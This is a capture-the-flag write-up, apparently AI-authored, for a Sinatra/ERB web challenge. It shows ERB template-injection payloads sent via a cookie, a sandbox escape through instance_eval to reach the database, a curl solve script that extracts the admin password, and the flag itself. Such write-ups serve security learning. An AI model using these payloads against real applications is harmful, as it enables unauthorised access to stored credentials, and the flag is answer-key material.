---
author: Claude
credit: Claude, Fenix
---
## Solution

### Analysis

The challenge provided a single file, `corrupted_app.rb`, a Sinatra (Ruby) web application with significant binary corruption in several key sections. The readable portions revealed:

- **Framework**: Sinatra with Sequel ORM and SQLite (readonly mode)
- **Dependencies**: `sinatra`, `json`, `sequel`, and `erb` (important!)
- **Database**: `sqlite://app.db?readonly=true&journal_mode=memory`
- **Endpoints**:
  - `GET /` - serves `index.html`
  - `POST /name` - returns a dev note message
  - `GET /highscores` - returns highscores from the database
  - `POST /upload-highscore` - disabled endpoint with security filtering

The corrupted sections obscured the actual SQL queries, security checks, and most of the business logic. The `require 'erb'` import was partially corrupted but identifiable.

### Approach

**Step 1: Reconnaissance**

The live server at `http://chal.bearcatctf.io:59047/` was explored:

- `GET /highscores` returned JSON with two players: "admin" (score 15) and "guest" (score 9223372036854775807 - max int, a sign of SQL injection).
- `POST /name` accepted a JSON body with a `name` field and set a cookie.
- `POST /upload-highscore` returned a "DEV NOTE" message reflecting the player name from the cookie.

**Step 2: SQL Injection Attempts (Dead End)**

Extensive SQL injection testing was performed on:
- The `name` cookie on `/upload-highscore`
- The `highscore` parameter
- Various HTTP headers

None triggered SQL errors or behavior changes. The endpoint always returned a static dev note message with the cookie name interpolated in.

**Step 3: Server-Side Template Injection (SSTI) Discovery**

The key breakthrough came from noticing the `require 'erb'` import. Testing ERB template injection via the `name` cookie:

```bash
curl -b 'name=<%= 7*7 %>' -X POST http://chal.bearcatctf.io:59047/upload-highscore
```

The response reflected `49` instead of the ERB expression -- confirming **ERB template injection** in the `/upload-highscore` endpoint.

**Step 4: Sandbox Enumeration**

The ERB code executed inside an `ERBSandbox` class. Enumerating the sandbox:

```erb
<%= self.class %>                    # => ERBSandbox
<%= methods.sort %>                  # => [:db, :playerName, :get_binding, ...]
<%= db.class %>                      # => DatabaseProxy
<%= db.methods - Object.methods %>   # => [:highscores, :help]
```

The `DatabaseProxy` only exposed `highscores` (returning the same data as `/highscores`) and `help`.

**Step 5: Escaping the Proxy**

The proxy was bypassed using `instance_eval` to access the underlying Sequel database object:

```erb
<%= db.instance_eval { @db }.class %>   # => Sequel::SQLite::Database
```

**Step 6: Database Enumeration and Flag Extraction**

With access to the real database object:

```erb
# List tables
<%= db.instance_eval { @db }.tables %>   # => [:players]

# Get schema
<%= db.instance_eval { @db }.schema(:players) %>
# => [[:id, ...], [:username, ...], [:password, ...], [:highscore, ...]]

# Extract admin password (the flag)
<%= db.instance_eval { @db }[:players].where(username: :admin).get(:password) %>
```

This returned the flag directly from the `password` column of the `players` table for the `admin` user.

### Key Insights

1. The `require 'erb'` import hinted at template injection, not SQL injection.
2. The `name` cookie was interpolated into an ERB template on the `/upload-highscore` endpoint.
3. An `ERBSandbox` with a `DatabaseProxy` restricted direct database access.
4. `instance_eval { @db }` bypassed the proxy to access the underlying Sequel database.
5. The flag was stored as the admin's password in the `players` table, consistent with the challenge narrative.

### Solve Script

```bash
# 1. Confirm SSTI
curl -b 'name=<%= 7*7 %>' -X POST http://chal.bearcatctf.io:59047/upload-highscore

# 2. Enumerate sandbox
curl -b 'name=<%= self.class %>' -X POST http://chal.bearcatctf.io:59047/upload-highscore
curl -b 'name=<%= methods.sort %>' -X POST http://chal.bearcatctf.io:59047/upload-highscore

# 3. Escape proxy and list tables
curl -b 'name=<%= db.instance_eval { @db }.tables %>' -X POST http://chal.bearcatctf.io:59047/upload-highscore

# 4. Get admin password (flag)
curl -b 'name=<%= db.instance_eval { @db }[:players].where(username: :admin).get(:password) %>' -X POST http://chal.bearcatctf.io:59047/upload-highscore
```

## Flag
`BCCTF{$SAFECr4cK1N6_8r1nG5_M3_50_mUCh_J0Y!}`
